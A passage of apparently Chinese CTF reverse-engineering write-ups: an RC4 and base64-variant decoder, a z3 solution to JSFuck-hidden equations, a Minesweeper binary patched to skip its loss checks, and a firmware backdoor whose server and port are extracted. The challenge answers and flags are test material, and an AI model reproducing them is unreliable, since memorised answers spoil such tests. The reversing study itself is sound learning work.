8); v3 = strlen(s); sub_4007DB(v9, s, v3); v4 = strlen(s); sub_4008FA(s, v4, v12, v6); for ( i = 0; i &lt;= 50; ++i ) &#123; if ( v12[i] != byte_602080[i] ) &#123; puts(&quot;Wrong&quot;); return 0LL; &#125; &#125; puts(&quot;Good&quot;); return 0LL;&#125; 这个数组的值已经给出来了 123456[0x5A, 0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44, 0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56, 0x4C, 0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79, 0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67, 0x4C, 0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70, 0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C, 0x76, 0x5A, 0x45, 0x3D] 接下来就看三个函数分别做了些什么吧 # sub_4006B6 函数 123456789101112131415161718192021222324252627282930bool __fastcall sub_4006B6(_DWORD *a1, __int64 a2, int a3)&#123; bool result; // al int i; // [rsp+1Ch] [rbp-18h] int j; // [rsp+1Ch] [rbp-18h] int v6; // [rsp+20h] [rbp-14h] int v7; // [rsp+24h] [rbp-10h] int v8; // [rsp+28h] [rbp-Ch] _DWORD *v9; // [rsp+2Ch] [rbp-8h] *a1 = 0; a1[1] = 0; v9 = a1 + 2; for ( i = 0; i &lt;= 255; ++i ) v9[i] = i; v7 = 0; result = 0; LOBYTE(v6) = 0; for ( j = 0; j &lt;= 255; ++j ) &#123; v8 = v9[j]; v6 = (v6 + v8 + *(v7 + a2)); v9[j] = v9[v6]; v9[v6] = v8; result = ++v7 &gt;= a3; if ( v7 &gt;= a3 ) v7 = 0; &#125; return result;&#125; 这里很明显可以看出就是 RC4 加密，这里是在创建 S 盒，并且进行了一部分的置换 # sub_4007DB 函数 12345678910111213141516171819202122232425262728_DWORD *__fastcall sub_4007DB(_DWORD *a1, __int64 a2, int a3)&#123; _DWORD *result; // rax int i; // [rsp+18h] [rbp-1Ch] int v5; // [rsp+1Ch] [rbp-18h] int v6; // [rsp+20h] [rbp-14h] int v7; // [rsp+24h] [rbp-10h] int v8; // [rsp+28h] [rbp-Ch] _DWORD *v9; // [rsp+2Ch] [rbp-8h] v5 = *a1; v6 = a1[1]; v9 = a1 + 2; for ( i = 0; i &lt; a3; ++i ) &#123; v5 = (v5 + 1); v7 = v9[v5]; v6 = (v6 + v7); v8 = v9[v6]; v9[v5] = v8; v9[v6] = v7; *(i + a2) ^= LOBYTE(v9[(v7 + v8)]); &#125; *a1 = v5; result = a1; a1[1] = v6; return result;&#125; 这里是 RC4 加密的后一部分，再进行了最后的 S 盒的置换后，用新的 S 盒和我们输入的 flag 进行异或运算，得到加密后的结果，这里 v9 就是最后的 S 盒，a2 是 flag # sub_4008FA 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_DWORD *__fastcall sub_4008FA(__int64 a1, int a2, const char *a3, _DWORD *a4)&#123; int v4; // eax int v5; // eax unsigned __int8 v6; // al int v7; // eax unsigned __int8 v8; // al int v9; // eax int v10; // edx _DWORD *result; // rax char v13; // [rsp+2Dh] [rbp-13h] unsigned __int8 v14; // [rsp+2Eh] [rbp-12h] unsigned __int8 v15; // [rsp+2Fh] [rbp-11h] int v16; // [rsp+30h] [rbp-10h] int v17; // [rsp+34h] [rbp-Ch] v16 = 0; v17 = 0; while ( v17 &lt; a2 ) &#123; v4 = v17++; v13 = *(v4 + a1); if ( v17 &gt;= a2 ) &#123; v6 = 0; &#125; else &#123; v5 = v17++; v6 = *(v5 + a1); &#125; v14 = v6; if ( v17 &gt;= a2 ) &#123; v8 = 0; &#125; else &#123; v7 = v17++; v8 = *(v7 + a1); &#125; v15 = v8; a3[v16] = ((v13 &gt;&gt; 2) &amp; 0x3F) + 61; a3[v16 + 1] = (((v14 &gt;&gt; 4) | (16 * v13)) &amp; 0x3F) + 61; a3[v16 + 2] = (((v8 &gt;&gt; 6) | (4 * v14)) &amp; 0x3F) + 61; v9 = v16 + 3; v16 += 4; a3[v9] = (v15 &amp; 0x3F) + 61; &#125; if ( a2 % 3 == 1 ) &#123; a3[--v16] = 61; &#125; else if ( a2 % 3 != 2 ) &#123; goto LABEL_15; &#125; a3[v16 - 1] = 61;LABEL_15: v10 = strlen(a3); result = a4; *a4 = v10; return result;&#125; 这个函数很像 base64，因为它在 43~48 行有一个三字节变四字节的操作，不过又不是完整的 base64，感觉也不像是换表的操作，根本没有找到表，所以最后还是直接逆运算搞出来了 # 整体思路 前两个函数是 RC4 加密，具体的 v9 值可以动调提取数据 通过汇编代码可以看出来这个 v9 的值应该就是 edx 里面的值了，esi 是输入的值，动调的时候直接在 xor 这里下个断点就可以看了，下面是 v9 的值也就是最后的 S 盒 123456789[0x10, 0x59, 0x9C, 0x92, 0x06, 0x22, 0xCF, 0xA5, 0x72, 0x1E, 0x45, 0x6A, 0x06, 0xCB, 0x08, 0xC3, 0xE4, 0x49, 0x5A, 0x63, 0x0C, 0xDF, 0xF6, 0x5F, 0x08, 0x28, 0xBD, 0xE2, 0x10, 0x15, 0x1F, 0x6E, 0xAA, 0x5A, 0xCA, 0xEC, 0x80, 0xAF, 0x9B, 0x16, 0xBB, 0x3D, 0x13, 0x2F, 0x6A, 0xA4, 0xC7, 0x2E, 0xBC, 0x4B, 0x60, 0x9A, 0xAF, 0xE9, 0xCE, 0xDA, 0x67, 0x39, 0xBA, 0x3B, 0x85, 0xEB, 0xD2, 0x6B, 0xAB, 0x06, 0x6B, 0x10, 0x57, 0x2C, 0x88, 0x70, 0xF7, 0x4F, 0xAA, 0x7F, 0x12, 0x47, 0xD6, 0xDE, 0x74, 0xB2, 0x1D, 0xA4, 0xD7, 0x76, 0x9A, 0xE0] 在输入的 flag 和这个 v9 异或之后，又在第三个函数中将其 3 变 4，并有一点点的运算在里面，这个我们直接拿最后的结果反向算一遍就可以了 其中 v13，v14，v8 也就是 v15，分别是原来的三个字节，而在这里它被改变成了 a3 [v16] 到 a3 [v16+3] 相当于四个字节，所以原来的三个字节就是前两个函数加密后的结果，我们只要把它四个四个一组恢复成三字节就行了，还要注意一下这个位移和与运算的关系，v14 和 v15 放到一起的时候要把 0x3F 拆开，不然 flag 会不完整 # 脚本 123456789101112131415161718192021222324252627a = [0x5A, 0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44, 0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56, 0x4C, 0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79, 0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67, 0x4C, 0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70, 0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C, 0x76, 0x5A, 0x45, 0x3D]flag = &#x27;&#x27;for i in range(0, len(a), 4): flag += chr((((a[i] - 61) &amp; 0x3F) &lt;&lt; 2) | (((a[i+1] - 61) &amp; 0x30) &gt;&gt; 4)) flag += chr((((a[i+1] - 61) &amp; 0x0F) &lt;&lt; 4) | (((a[i+2] - 61) &amp; 0x3C) &gt;&gt; 2)) # 这里0x30和0x3C可以去掉 flag += chr(((a[i+3] - 61) &amp; 0x3F) | (((a[i+2] - 61) &amp; 0x03) &lt;&lt; 6))S = [0x10, 0x59, 0x9C, 0x92, 0x06, 0x22, 0xCF, 0xA5, 0x72, 0x1E, 0x45, 0x6A, 0x06, 0xCB, 0x08, 0xC3, 0xE4, 0x49, 0x5A, 0x63, 0x0C, 0xDF, 0xF6, 0x5F, 0x08, 0x28, 0xBD, 0xE2, 0x10, 0x15, 0x1F, 0x6E, 0xAA, 0x5A, 0xCA, 0xEC, 0x80, 0xAF, 0x9B, 0x16, 0xBB, 0x3D, 0x13, 0x2F, 0x6A, 0xA4, 0xC7, 0x2E, 0xBC, 0x4B, 0x60, 0x9A, 0xAF, 0xE9, 0xCE, 0xDA, 0x67, 0x39, 0xBA, 0x3B, 0x85, 0xEB, 0xD2, 0x6B, 0xAB, 0x06, 0x6B, 0x10, 0x57, 0x2C, 0x88, 0x70, 0xF7, 0x4F, 0xAA, 0x7F, 0x12, 0x47, 0xD6, 0xDE, 0x74, 0xB2, 0x1D, 0xA4, 0xD7, 0x76, 0x9A, 0xE0]for i in range(len(flag)): flag += chr(ord(flag[i]) ^ S[i])print(flag) 我这个脚本有点 bug，输出的结果前面会有一串乱码，但是结果是对的 得到 flag {e10adc3949ba59abbe56e057f20f883e}","tags":["reverse"],"categories":["wp"]},{"title":"equation","path":"/2022/07/06/equation/","content":"拿到题目之后，有两个文件，一个.DS_Store 和一个 equation，然后上网查了一下.DS_Store 文件 DS_Store，英文全称是 Desktop Services Store（桌面服务存储），开头的 DS 是 Desktop Services（桌面服务） 的缩写。它是一种由 macOS 系统自动创建的隐藏文件，存在于每一个用「访达」打开过的文件夹下面 并没有什么用，用各种编辑器打开看了都没什么有用的信息，然后在看 equation.html，点开之后可以看到 虽然没学过 javascript，但很明显这里只要 if 的条件成立就正确，flag 就在其中，根据题目的提示，这是 fuck 加密，而且大概分析一下可以看出来，这是一个多元一次方程组，最后可以用 z3-solver 来解，现在就是要解密了，这个 jsfuck 加密可以在网上找到在线工具解密，但是每次都要把 l 括号里面的密文复制出来一个一个去解密，就很麻烦，所以就在网上找了个脚本一次性解了 12345678910111213&lt;script&gt;\tfunction deEquation(str) &#123; for(let i = 0; i &lt;= 1; i++) &#123; str = str.replace(/l\\[(\\D*?)](\\+l|-l|==)/g, (m, a, b) =&gt; &#x27;l[&#x27; + eval(a) + &#x27;]&#x27; + b); &#125; str = str.replace(/==(\\D*?)&amp;&amp;/g, (m, a) =&gt; &#x27;==&#x27; + eval(a) + &#x27;&amp;&amp;&#x27;); return str;\t&#125;\tjs=&quot;&quot;//将代码放入其中\tres=deEquation(js);\tdocument.write(res);&lt;/script&gt; 用 notepad 保存之后拖到浏览器打开就可以运行出结果了，不过最后一个方程的结果没解出来，就用在线工具解一下，等于 81，最后把这些方程用 z3-solver 解一下 flag 就出来了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from z3 import *s=Solver()l=IntVector(&#x27;l&#x27;,42)s.add(l[40]+l[35]+l[34]-l[0]-l[15]-l[37]+l[7]+l[6]-l[26]+l[20]+l[19]+l[8]-l[17]-l[14]-l[38]+l[1]-l[9]+l[22]+l[41]+l[3]-l[29]-l[36]-l[25]+l[5]+l[32]-l[16]+l[12]-l[24]+l[30]+l[39]+l[10]+l[2]+l[27]+l[28]+l[21]+l[33]-l[18]+l[4]==861)s.add(l[31]+l[26]+l[11]-l[33]+l[27]-l[3]+l[12]+l[30]+l[1]+l[32]-l[16]+l[7]+l[10]-l[25]+l[38]-l[41]-l[14]-l[19]+l[29]+l[36]-l[9]-l[28]-l[6]-l[0]-l[22]-l[18]+l[20]-l[37]+l[4]-l[24]+l[34]-l[21]-l[39]-l[23]-l[8]-l[40]+l[15]-l[35]==-448)s.add(l[26]+l[14]+l[15]+l[9]+l[13]+l[30]-l[11]+l[18]+l[23]+l[7]+l[3]+l[12]+l[25]-l[24]-l[39]-l[35]-l[20]+l[40]-l[8]+l[10]-l[5]-l[33]-l[31]+l[32]+l[19]+l[21]-l[6]+l[1]+l[16]+l[17]+l[29]+l[22]-l[4]-l[36]+l[41]+l[38]+l[2]+l[0]==1244)s.add(l[5]+l[22]+l[15]+l[2]-l[28]-l[10]-l[3]-l[13]-l[18]+l[30]-l[9]+l[32]+l[19]+l[34]+l[23]-l[17]+l[16]-l[7]+l[24]-l[39]+l[8]-l[12]-l[40]-l[25]+l[37]-l[35]+l[11]-l[14]+l[20]-l[27]+l[4]-l[33]-l[21]+l[31]-l[6]+l[1]+l[38]-l[29]==-39)s.add(l[41]-l[29]+l[23]-l[4]+l[20]-l[33]+l[35]+l[3]-l[19]-l[21]+l[11]+l[26]-l[24]-l[17]+l[37]+l[1]+l[16]-l[0]-l[13]+l[7]+l[10]+l[14]+l[22]+l[39]-l[40]+l[34]-l[38]+l[32]+l[25]-l[2]+l[15]+l[6]+l[28]-l[8]-l[5]-l[31]-l[30]-l[27]==485)s.add(l[13]+l[19]+l[21]-l[2]-l[33]-l[0]+l[39]+l[31]-l[23]-l[41]+l[38]-l[29]+l[36]+l[24]-l[20]-l[9]-l[32]+l[37]-l[35]+l[40]+l[7]-l[26]+l[15]-l[10]-l[6]-l[16]-l[4]-l[5]-l[30]-l[14]-l[22]-l[25]-l[34]-l[17]-l[11]-l[27]+l[1]-l[28]==-1068)s.add(l[32]+l[0]+l[9]+l[14]+l[11]+l[18]-l[13]+l[24]-l[2]-l[15]+l[19]-l[21]+l[1]+l[39]-l[8]-l[3]+l[33]+l[6]-l[5]-l[35]-l[28]+l[25]-l[41]+l[22]-l[17]+l[10]+l[40]+l[34]+l[27]-l[20]+l[23]+l[31]-l[16]+l[7]+l[12]-l[30]+l[29]-l[4]==939)s.add(l[19]+l[11]+l[20]-l[16]+l[40]+l[25]+l[1]-l[31]+l[28]-l[23]+l[14]-l[9]-l[27]+l[35]+l[39]-l[37]-l[8]-l[22]+l[5]-l[6]+l[0]-l[32]+l[24]+l[33]+l[29]+l[38]+l[15]-l[2]+l[30]+l[7]+l[12]-l[3]-l[17]+l[34]+l[41]-l[4]-l[13]-l[26]==413)s.add(l[22]+l[4]-l[9]+l[34]+l[35]+l[17]+l[3]-l[24]+l[38]-l[5]-l[41]-l[31]-l[0]-l[25]+l[33]+l[15]-l[1]-l[10]+l[16]-l[29]-l[12]+l[26]-l[39]-l[21]-l[18]-l[6]-l[40]-l[13]+l[8]+l[37]+l[19]+l[14]+l[32]+l[28]-l[11]+l[23]+l[36]+l[7]==117)s.add(l[32]+l[16]+l[3]+l[11]+l[34]-l[31]+l[14]+l[25]+l[1]-l[30]-l[33]-l[40]-l[4]-l[29]+l[18]-l[27]+l[13]-l[19]-l[12]+l[23]-l[39]-l[41]-l[8]+l[22]-l[5]-l[38]-l[9]-l[37]+l[17]-l[36]+l[24]-l[21]+l[2]-l[26]+l[20]-l[7]+l[35]-l[0]==-313)s.add(l[40]-l[1]+l[5]+l[7]+l[33]+l[29]+l[12]+l[38]-l[31]+l[2]+l[14]-l[35]-l[8]-l[24]-l[39]-l[9]-l[28]+l[23]-l[17]-l[22]-l[26]+l[32]-l[11]+l[4]-l[36]+l[10]+l[20]-l[18]-l[16]+l[6]-l[0]+l[3]-l[30]+l[37]-l[19]+l[21]+l[25]-l[15]==-42)s.add(l[21]+l[26]-l[17]-l[25]+l[27]-l[22]-l[39]-l[23]-l[15]-l[20]-l[32]+l[12]+l[3]-l[6]+l[28]+l[31]+l[13]-l[16]-l[37]-l[30]-l[5]+l[41]+l[29]+l[36]+l[1]+l[11]+l[24]+l[18]-l[40]+l[19]-l[35]+l[2]-l[38]+l[14]-l[9]+l[4]+l[0]-l[33]==289)s.add(l[29]+l[31]+l[32]-l[17]-l[7]+l[34]+l[2]+l[14]+l[23]-l[4]+l[3]+l[35]-l[33]-l[9]-l[20]-l[37]+l[24]-l[27]+l[36]+l[15]-l[18]-l[0]+l[12]+l[11]-l[38]+l[6]+l[22]+l[39]-l[25]-l[10]-l[19]-l[1]+l[13]-l[41]+l[30]-l[16]+l[28]-l[26]==-117)s.add(l[5]+l[37]-l[39]+l[0]-l[27]+l[12]+l[41]-l[22]+l[8]-l[16]-l[38]+l[9]+l[15]-l[35]-l[29]+l[18]+l[6]-l[25]-l[28]+l[36]+l[34]+l[32]-l[14]-l[1]+l[20]+l[40]-l[19]-l[4]-l[7]+l[26]+l[30]-l[10]+l[13]-l[21]+l[2]-l[23]-l[3]-l[33]==-252)s.add(l[29]+l[10]-l[41]-l[9]+l[12]-l[28]+l[11]+l[40]-l[27]-l[8]+l[32]-l[25]-l[23]+l[39]-l[1]-l[36]-l[15]+l[33]-l[20]+l[18]+l[22]-l[3]+l[6]-l[34]-l[21]+l[19]+l[26]+l[13]-l[4]+l[7]-l[37]+l[38]-l[2]-l[30]-l[0]-l[35]+l[5]+l[17]==-183)s.add(l[6]-l[8]-l[20]+l[34]-l[33]-l[25]-l[4]+l[3]+l[17]-l[13]-l[15]-l[40]+l[1]-l[30]-l[14]-l[28]-l[35]+l[38]-l[22]+l[2]+l[24]-l[29]+l[5]+l[9]+l[37]+l[23]-l[18]+l[19]-l[21]+l[11]+l[36]+l[41]-l[7]-l[32]+l[10]+l[26]-l[0]+l[31]==188)s.add(l[3]+l[6]-l[41]+l[10]+l[39]+l[37]+l[1]+l[8]+l[21]+l[24]+l[29]+l[12]+l[27]-l[38]+l[11]+l[23]+l[28]+l[33]-l[31]+l[14]-l[5]+l[32]-l[17]+l[40]-l[34]+l[20]-l[22]-l[16]+l[19]+l[2]-l[36]-l[7]+l[18]+l[15]+l[26]-l[0]-l[4]+l[35]==1036)s.add(l[28]-l[33]+l[2]+l[37]-l[12]-l[9]-l[39]+l[16]-l[32]+l[8]-l[36]+l[31]+l[10]-l[4]+l[21]-l[25]+l[18]+l[24]-l[0]+l[29]-l[26]+l[35]-l[22]-l[41]-l[6]+l[15]+l[19]+l[40]+l[7]+l[34]+l[17]-l[3]-l[13]+l[5]+l[23]+l[11]-l[27]+l[1]==328)s.add(l[22]-l[32]+l[17]-l[9]+l[20]-l[18]-l[34]+l[23]+l[36]-l[35]-l[38]+l[27]+l[4]-l[5]-l[41]+l[29]+l[33]+l[0]-l[37]+l[28]-l[40]-l[11]-l[12]+l[7]+l[1]+l[2]-l[26]-l[16]-l[8]+l[24]-l[25]+l[3]-l[6]-l[19]-l[39]-l[14]-l[31]+l[10]==-196)s.add(l[11]+l[13]+l[14]-l[15]-l[29]-l[2]+l[7]+l[20]+l[30]-l[36]-l[33]-l[19]+l[31]+l[0]-l[39]-l[4]-l[6]+l[38]+l[35]-l[28]+l[34]-l[9]-l[23]-l[26]+l[37]-l[8]-l[27]+l[5]-l[41]+l[3]+l[17]+l[40]-l[10]+l[25]+l[12]-l[24]+l[18]+l[32]==7)s.add(l[34]-l[37]-l[40]+l[4]-l[22]-l[31]-l[6]+l[38]+l[13]-l[28]+l[8]+l[30]-l[20]-l[7]-l[32]+l[26]+l[1]-l[18]+l[5]+l[35]-l[24]-l[41]+l[9]-l[0]-l[2]-l[15]-l[10]+l[12]-l[36]+l[33]-l[16]-l[14]-l[25]-l[29]-l[21]+l[27]+l[3]-l[17]==-945)s.add(l[12]-l[30]-l[8]+l[20]-l[2]-l[36]-l[25]-l[0]-l[19]-l[28]-l[7]-l[11]-l[33]+l[4]-l[23]+l[10]-l[41]+l[39]-l[32]+l[27]+l[18]+l[15]+l[34]+l[13]-l[40]+l[29]-l[6]+l[37]-l[14]-l[16]+l[38]-l[26]+l[17]+l[31]-l[22]-l[35]+l[5]-l[1]==-480)s.add(l[36]-l[11]-l[34]+l[8]+l[0]+l[15]+l[28]-l[39]-l[32]-l[2]-l[27]+l[22]+l[16]-l[30]-l[3]+l[31]-l[26]+l[20]+l[17]-l[29]-l[18]+l[19]-l[10]+l[6]-l[5]-l[38]-l[25]-l[24]+l[4]+l[23]+l[9]+l[14]+l[21]-l[37]+l[13]-l[41]-l[12]+l[35]==-213)s.add(l[19]-l[36]-l[12]+l[33]-l[27]-l[37]-l[25]+l[38]+l[16]-l[18]+l[22]-l[39]+l[13]-l[7]-l[31]-l[26]+l[15]-l[10]-l[9]-l[2]-l[30]-l[11]+l[41]-l[4]+l[24]+l[34]+l[5]+l[17]+l[14]+l[6]+l[8]-l[21]-l[23]+l[32]-l[1]-l[29]-l[0]+l[3]==-386)s.add(l[0]+l[7]-l[28]-l[38]+l[19]+l[31]-l[5]+l[24]-l[3]+l[33]-l[12]-l[29]+l[32]+l[1]-l[34]-l[9]-l[25]+l[26]-l[8]+l[4]-l[10]+l[40]-l[15]-l[11]-l[27]+l[36]+l[14]+l[41]-l[35]-l[13]-l[17]-l[21]-l[18]+l[39]-l[2]+l[20]-l[23]-l[22]==-349)s.add(l[10]+l[22]+l[21]-l[0]+l[15]-l[6]+l[20]-l[29]-l[30]-l[33]+l[19]+l[23]-l[28]+l[41]-l[27]-l[12]-l[37]-l[32]+l[34]-l[36]+l[3]+l[1]-l[13]+l[18]+l[14]+l[9]+l[7]-l[39]+l[8]+l[2]-l[31]-l[5]-l[40]+l[38]-l[26]-l[4]+l[16]-l[25]==98)s.add(l[28]+l[38]+l[20]+l[0]-l[5]-l[34]-l[41]+l[22]-l[26]+l[11]+l[29]+l[31]-l[3]-l[16]+l[23]+l[17]-l[18]+l[9]-l[4]-l[12]-l[19]-l[40]-l[27]+l[33]+l[8]-l[37]+l[2]+l[15]-l[24]-l[39]+l[10]+l[35]-l[1]+l[30]-l[36]-l[25]-l[14]-l[32]==-412)s.add(l[1]-l[24]-l[29]+l[39]+l[41]+l[0]+l[9]-l[19]+l[6]-l[37]-l[22]+l[32]+l[21]+l[28]+l[36]+l[4]-l[17]+l[20]-l[13]-l[35]-l[5]+l[33]-l[27]-l[30]+l[40]+l[25]-l[18]+l[34]-l[3]-l[10]-l[16]-l[23]-l[38]+l[8]-l[14]-l[11]-l[7]+l[12]==-95)s.add(l[2]-l[24]+l[31]+l[0]+l[9]-l[6]+l[7]-l[1]-l[22]+l[8]-l[23]+l[40]+l[20]-l[38]-l[11]-l[14]+l[18]-l[36]+l[15]-l[4]-l[41]-l[12]-l[34]+l[32]-l[35]+l[17]-l[21]-l[10]-l[29]+l[39]-l[16]+l[27]+l[26]-l[3]-l[5]+l[13]+l[25]-l[28]==-379)s.add(l[19]-l[17]+l[31]+l[14]+l[6]-l[12]+l[16]-l[8]+l[27]-l[13]+l[41]+l[2]-l[7]+l[32]+l[1]+l[25]-l[9]+l[37]+l[34]-l[18]-l[40]-l[11]-l[10]+l[38]+l[21]+l[3]-l[0]+l[24]+l[15]+l[23]-l[20]+l[26]+l[22]-l[4]-l[28]-l[5]+l[39]+l[35]==861)s.add(l[35]+l[36]-l[16]-l[26]-l[31]+l[0]+l[21]-l[13]+l[14]+l[39]+l[7]+l[4]+l[34]+l[38]+l[17]+l[22]+l[32]+l[5]+l[15]+l[8]-l[29]+l[40]+l[24]+l[6]+l[30]-l[2]+l[25]+l[23]+l[1]+l[12]+l[9]-l[10]-l[3]-l[19]+l[20]-l[37]-l[33]-l[18]==1169)s.add(l[13]+l[0]-l[25]-l[32]-l[21]-l[34]-l[14]-l[9]-l[8]-l[15]-l[16]+l[38]-l[35]-l[30]-l[40]-l[12]+l[3]-l[19]+l[4]-l[41]+l[2]-l[36]+l[37]+l[17]-l[1]+l[26]-l[39]-l[10]-l[33]+l[5]-l[27]-l[23]-l[24]-l[7]+l[31]-l[28]-l[18]+l[6]==-1236)s.add(l[20]+l[27]-l[29]-l[25]-l[3]+l[28]-l[32]-l[11]+l[10]+l[31]+l[16]+l[21]-l[7]+l[4]-l[24]-l[35]+l[26]+l[12]-l[37]+l[6]+l[23]+l[41]-l[39]-l[38]+l[40]-l[36]+l[8]-l[9]-l[5]-l[1]-l[13]-l[14]+l[19]+l[0]-l[34]-l[15]+l[17]+l[22]==-114)s.add(l[12]-l[28]-l[13]-l[23]-l[33]+l[18]+l[10]+l[11]+l[2]-l[36]+l[41]-l[16]+l[39]+l[34]+l[32]+l[37]-l[38]+l[20]+l[6]+l[7]+l[31]+l[5]+l[22]-l[4]-l[15]-l[24]+l[17]-l[3]+l[1]-l[35]-l[9]+l[30]+l[25]-l[0]-l[8]-l[14]+l[26]+l[21]==659)s.add(l[21]-l[3]+l[7]-l[27]+l[0]-l[32]-l[24]-l[37]+l[4]-l[22]+l[20]-l[5]-l[30]-l[31]-l[1]+l[15]+l[41]+l[12]+l[40]+l[38]-l[17]-l[39]+l[19]-l[13]+l[23]+l[18]-l[2]+l[6]-l[33]-l[9]+l[28]+l[8]-l[16]-l[10]-l[14]+l[34]+l[35]-l[11]==-430)s.add(l[11]-l[23]-l[9]-l[19]+l[17]+l[38]-l[36]-l[22]-l[10]+l[27]-l[14]-l[4]+l[5]+l[31]+l[2]+l[0]-l[16]-l[8]-l[28]+l[3]+l[40]+l[25]-l[33]+l[13]-l[32]-l[35]+l[26]-l[20]-l[41]-l[30]-l[12]-l[7]+l[37]-l[39]+l[15]+l[18]-l[29]-l[21]==-513)s.add(l[32]+l[19]+l[4]-l[13]-l[17]-l[30]+l[5]-l[33]-l[37]-l[15]-l[18]+l[7]+l[25]-l[14]+l[35]+l[40]+l[16]+l[1]+l[2]+l[26]-l[3]-l[39]-l[22]+l[23]-l[36]-l[27]-l[9]+l[6]-l[41]-l[0]-l[31]-l[20]+l[12]-l[8]+l[29]-l[11]-l[34]+l[21]==-502)s.add(l[30]-l[31]-l[36]+l[3]+l[9]-l[40]-l[33]+l[25]+l[39]-l[26]+l[23]-l[0]-l[29]-l[32]-l[4]+l[37]+l[28]+l[21]+l[17]+l[2]+l[24]+l[6]+l[5]+l[8]+l[16]+l[27]+l[19]+l[12]+l[20]+l[41]-l[22]+l[15]-l[11]+l[34]-l[18]-l[38]+l[1]-l[14]==853)s.add(l[38]-l[10]+l[16]+l[8]+l[21]-l[25]+l[36]-l[30]+l[31]-l[3]+l[5]-l[15]+l[23]-l[28]+l[7]+l[12]-l[29]+l[22]-l[0]-l[37]-l[14]-l[11]+l[32]+l[33]-l[9]+l[39]+l[41]-l[19]-l[1]+l[18]-l[4]-l[6]+l[13]+l[20]-l[2]-l[35]-l[26]+l[27]==-28)s.add(l[11]+l[18]-l[26]+l[15]-l[14]-l[33]+l[7]-l[23]-l[25]+l[0]-l[6]-l[21]-l[16]+l[17]-l[19]-l[28]-l[38]-l[37]+l[9]+l[20]-l[8]-l[3]+l[22]-l[35]-l[10]-l[31]-l[2]+l[41]-l[1]-l[4]+l[24]-l[34]+l[39]+l[40]+l[32]-l[5]+l[36]-l[27]==-529)s.add(l[38]+l[8]+l[36]+l[35]-l[23]-l[34]+l[13]-l[4]-l[27]-l[24]+l[26]+l[31]-l[30]-l[5]-l[40]+l[28]-l[11]-l[2]-l[39]+l[15]+l[10]-l[17]+l[3]+l[19]+l[22]+l[33]+l[0]+l[37]+l[16]-l[9]-l[32]+l[25]-l[21]-l[12]+l[6]-l[41]+l[20]-l[18]==-12)s.add(l[6]-l[30]-l[20]-l[27]-l[14]-l[39]+l[41]-l[33]-l[0]+l[25]-l[32]-l[3]+l[26]-l[12]+l[8]-l[35]-l[24]+l[15]+l[9]-l[4]+l[13]+l[36]+l[34]+l[1]-l[28]-l[21]+l[18]+l[23]+l[29]-l[10]-l[38]+l[22]+l[37]+l[5]+l[19]+l[7]+l[16]-l[31]==81)check=s.check()print(check)model = s.model()print(model)for i in range(42): print(chr(int(&quot;%s&quot;%(model[l[i]]))),end=&#x27;&#x27;) 得到 flag {A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3}","tags":["reverse"],"categories":["wp"]},{"title":"UltimateMinesweeper","path":"/2022/07/05/UltimateMinesweeper/","content":"这是个游戏题，打开之后就是个扫雷，估计是排完雷就可以显示 flag 了，然后用 dnSpy 打开文件之后，感觉这个 GetKey 是关键函数，因为出现了一个数组，这里估计就是 flag 了，而且肯定有一些算法在里面，感觉可以通过脚本逆向出来（做完之后看别人的 wp 原来这里也无法用脚本逆出来，因为少了一个数组的数据） 但是在查壳的时候知道了这个程序使用 C# 写的，是在看不太懂，最多分析个大概的思路，就只能去猜它的意思，所以还是换个思路，就改一下里面的代码，看能不能强制通关之类的，然后我看到了这个函数 这里引用了 GetKey 函数，肯定是个关键点，而且这个 if 语句里面包含了 Application.Exit () 函数，这是用来退出程序的函数，估计就是不符合条件了也就是踩雷了就退出程序，所以我就把这两个 if 语句全删掉了，然后再编译并另存为新的程序，发现真的踩雷也不会挂了，所以就一直无敌 但是这个真的好难点，我一开始点的时候点累了，感觉有更好的方法，点到一半就关掉了，白点了那么多下好烦啊（后面看别人的 wp 的时候发现居然有人可以开透视挂，简直不要太爽，比无敌挂好用多了，不用点那么多下） 但是后来实在是想不出别的方法了（论精通各种编程语言的重要性，如果能看懂 C# 肯定会好做些），就还是老实地全点完了，刚点完发现给的答案是个乱码 到原来那个没被修改过的程序找到相应的位置才是真的 flag 得到 flag {Ch3aters_Alw4ys_W1n@flare-on.com}","tags":["reverse"],"categories":["wp"]},{"title":"firmware","path":"/2022/07/05/firmware/","content":"这个题刚开始就提示了我们要分析后门程序的服务器和端口，所以我们的目的就是要去找到后门程序，并且拿到服务器和端口，最后再 md5 加密一下就是我们的 flag 了。 在拿到题目之后，发现是个 bin 文件，上网查了一下，要用 binwalk 工具去提取里面的文件， 提取之后发现前面几个文件打开之后什么都没有，也没有所谓的后门文件，就剩一个 120200.squashfs 文件，这个东西我怎么都打不开，然后查了一下，原来它要用 firmware-mod-kit 来解压，才能提取里面的文件，把工具装好之后，解压，然后终于找到了一个 backdoor 文件，这应该就是后门文件了 然后检查一下这个后门程序，发现还有个 upx 的壳，那我们就脱壳 脱壳之后用 ida 打开，shift+F12 搜索字符串，看到一个网址 这应该就是 flag 的前一部分了，而剩下的端口应该就是一串数字了，找了一会在这里发现一段可疑代码 18 行 - 23 行是关键代码，根据题目给的提示，flag 加密前的形式是 (网址：端口) 的格式，而这里刚好出现了冒号，并且将冒号后面的数据整型化后赋给 v3，所以就是端口的值，这里的话 v3=36667 应该就是它默认的端口值，所以 36667 就是我们需要的端口，和前面的网址连起来就是 echo.byethost51.com:36667，MD5 一下就是我们的 flag 了 得到 flag 